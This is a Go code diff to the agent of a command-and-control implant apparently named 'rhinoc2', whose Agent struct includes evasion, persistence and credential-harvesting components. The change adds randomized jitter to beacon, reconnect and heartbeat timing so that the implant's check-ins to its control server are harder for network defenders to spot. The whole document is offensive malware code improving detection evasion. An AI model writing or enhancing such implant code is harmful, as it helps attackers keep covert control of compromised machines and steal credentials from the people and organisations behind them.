@@ -8,6 +8,7 @@ import (
 	"io"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"os"
 	"os/exec"
 	"rhinoc2/pkg/commands"
@@ -31,20 +32,20 @@ type Config struct {
 }
 
 type Agent struct {
-	id              string
-	config          Config
-	conn            *websocket.Conn
-	crypto          *crypto.CryptoHandler
-	commander       *commands.Commander
-	fileMgr         *commands.FileManager
-	netScanner      *commands.NetworkScanner
-	evasion         *evasion.EvasionHandler
-	persistence     *persistence.PersistenceHandler
-	credHarvest     *postexploit.CredentialHarvester
-	taskQueue       chan map[string]interface{}
-	activeTasks     int
-	maxActiveTasks  int
-	taskMu          sync.Mutex
+	id             string
+	config         Config
+	conn           *websocket.Conn
+	crypto         *crypto.CryptoHandler
+	commander      *commands.Commander
+	fileMgr        *commands.FileManager
+	netScanner     *commands.NetworkScanner
+	evasion        *evasion.EvasionHandler
+	persistence    *persistence.PersistenceHandler
+	credHarvest    *postexploit.CredentialHarvester
+	taskQueue      chan map[string]interface{}
+	activeTasks    int
+	maxActiveTasks int
+	taskMu         sync.Mutex
 }
 
 func generateID() string {
@@ -457,28 +458,36 @@ func (a *Agent) run() {
 		return
 	}
 
+	rand.Seed(time.Now().UnixNano())
+
 	for {
 		conn, _, err := websocket.DefaultDialer.Dial(a.config.ServerURL, nil)
 		if err != nil {
-			time.Sleep(a.config.Interval)
+			jitter := time.Duration(rand.Int63n(int64(a.config.Interval / 2)))
+			time.Sleep(a.config.Interval + jitter)
 			continue
 		}
 
 		a.conn = conn
 		if err := a.checkin(); err != nil {
 			conn.Close()
-			time.Sleep(a.config.Interval)
+			jitter := time.Duration(rand.Int63n(int64(a.config.Interval / 2)))
+			time.Sleep(a.config.Interval + jitter)
 			continue
 		}
 
 		ctx, cancel := context.WithCancel(context.Background())
-		ticker := time.NewTicker(a.config.Interval)
+		jitter := time.Duration(rand.Int63n(int64(a.config.Interval / 3)))
+		baseInterval := a.config.Interval + jitter
+		ticker := time.NewTicker(baseInterval)
 
 		go func() {
 			defer ticker.Stop()
 			for {
 				select {
 				case <-ticker.C:
+					jitter := time.Duration(rand.Int63n(int64(a.config.Interval / 3)))
+					ticker.Reset(a.config.Interval + jitter)
 					heartbeat := map[string]string{"status": "alive"}
 					data, err := json.Marshal(heartbeat)
 					if err != nil {
@@ -528,7 +537,8 @@ func (a *Agent) run() {
 
 		cancel()
 		conn.Close()
-		time.Sleep(a.config.Interval)
+		jitter = time.Duration(rand.Int63n(int64(a.config.Interval / 2)))
+		time.Sleep(a.config.Interval + jitter)
 	}
 }
 
